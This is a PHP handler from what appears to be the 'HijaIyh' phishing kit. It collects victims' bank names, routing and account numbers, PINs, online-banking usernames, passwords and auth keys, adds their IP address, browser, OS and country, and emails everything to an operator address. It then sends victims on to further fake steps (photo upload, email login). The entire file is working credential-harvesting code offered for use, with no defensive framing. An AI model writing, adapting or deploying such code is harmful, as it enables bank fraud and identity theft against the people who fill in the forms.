<?php 
/** HijaIyh App Framework
* @author justalinko
* @version 2.1
**/
echo '<center><br><br><br><br><img src="./HijaIyh_App/assets/img/spinner2.gif" style="margin-top:20%"></center>';


if(isset($_POST))
{

	$data = ['bankname' => $core->post('bankname'),
			 'routing' => $core->post('routing'),
			 'accnumber' => $core->post('accnumber'),
			 'pinbank' => $core->post('pinbank'),
			 'userbank' => $core->post('userbank'),
			 'passbank' => $core->post('passbank'),
			 'authkeys' => $core->post('authkeys'),
			 'useragent' => $_SERVER['HTTP_USER_AGENT'],
			 'ip' => $core->userIP(),
			 'country'=> $country_name,
			 'date' => date('D,d M Y H:i')
			];

	 $info = $country_name." - ".$core->getOS()." - ".$core->userIP()." - ".$core->getBrowser();

	$sendMsg = $core->parse_result('bank',$data);
	$sendSubj = "BANK ACCOUNT : $bank_name # $info";
	$sendFrom = "#HijaIyh:App";
    $core->sendmail($email_result,$sendFrom,$sendSubj,$sendMsg);
   
    $core->create_session($data);

	$core->stats('bank',$sendSubj);

	if($core->parse_hijaiyh('sp','photo') == 1)
            {
                $kemana = 'photo';
            }else{
                if($core->parse_hijaiyh('sp','email_login') == 1)
                {
                    $kemana = 'email';
                }else{
                    $kemana = 'finish';
                }
            }
	$core->redirect('?page='.$core->mobile_link($kemana).'&appIdKey='.$appidkey.'&locale='.$localex);

}